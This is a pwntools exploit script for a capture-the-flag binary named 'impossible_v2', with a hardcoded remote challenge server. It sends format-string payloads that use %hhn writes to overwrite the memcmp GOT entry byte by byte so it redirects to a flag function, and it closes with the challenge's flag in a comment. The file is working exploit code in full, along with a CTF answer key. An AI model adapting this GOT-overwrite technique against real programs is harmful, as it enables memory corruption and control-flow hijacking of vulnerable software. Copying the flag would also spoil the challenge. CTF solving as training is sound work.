#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./impossible_v2_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("static-03.herocft.fr", 5001)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	# flag    0x4014c6
	# memcmp  0x401090
	memcmp = p64(exe.got['memcmp'])
	memcmp_1 = p64(exe.got['memcmp'] + 1)

	first_byte = f'%{0xc6}c%9$hhn'.ljust(16, ' ').encode() + memcmp
	r.sendlineafter(b'message:', first_byte)
	r.sendlineafter(b'(y/n)', b'y')

	second_byte = f'%{0x14}c%9$hhn'.ljust(16, ' ').encode() + memcmp_1
	r.sendlineafter(b'):', second_byte)

	r.interactive()


if __name__ == "__main__":
	main()

# Hero{AES_ECB_1S_S0_345Y_WH3N_Y0U_C0NTR0L_TH3_K3Y!!!}
